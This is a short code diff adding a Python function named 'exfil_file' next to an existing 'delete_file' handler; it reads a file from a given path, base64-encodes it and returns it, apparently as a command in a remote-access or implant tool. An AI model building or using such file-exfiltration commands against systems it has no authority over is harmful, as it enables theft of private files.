@@ -139,3 +139,39 @@ def delete_file(args):
 
     except Exception as e:
         return {"status": "error", "message": str(e)}
+    
+    
+def exfil_file(args):
+    
+    path = args.get("path")
+    
+    if not path: 
+        return {"status": "error", "message": "path is required"}
+    
+    MAX_FILE_SIZE = 5 * 1024 * 1024 #max of 5MB for now
+    
+    if os.path.getsize(path) > MAX_FILE_SIZE:
+        return {"status": "error", "message": "File too large"}
+    
+    try:
+        with open(path, "rb") as f:
+            data = f.read()
+            
+        import base64
+        encoded = base64.b64encode(data).decode()
+        
+        return {
+            "status" : "success",
+            "filename" : path,
+            "data" : encoded
+        }
+        
+    except FileNotFoundError:
+        return {"status": "error", "message": "File not found"}
+
+    except PermissionError:
+        return {"status": "error", "message": "Permission denied"}
+
+    except Exception as e:
+        return {"status": "error", "message": str(e)}   
+        
